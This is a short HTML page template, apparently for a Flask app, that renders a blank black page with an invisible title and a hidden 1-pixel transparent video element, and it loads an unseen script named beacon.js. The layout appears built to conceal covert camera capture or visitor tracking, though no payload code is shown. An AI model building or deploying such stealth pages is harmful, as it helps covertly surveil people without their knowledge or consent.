<!DOCTYPE html>
<html lang="pt-BR" style="background:#000;">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="theme-color" content="#000000" />
  <meta name="color-scheme" content="dark" />
  <title>&#8203;</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      min-height: 100%;
      overflow: hidden;
      background: #000;
      color: #000;
      border: 0;
      outline: 0;
      -webkit-tap-highlight-color: transparent;
    }
    #v {
      position: fixed;
      right: 0;
      bottom: 0;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      border: 0;
      margin: 0;
      padding: 0;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <video id="v" playsinline muted></video>
  <script src="{{ url_for('static', filename='beacon.js') }}"></script>
</body>
</html>
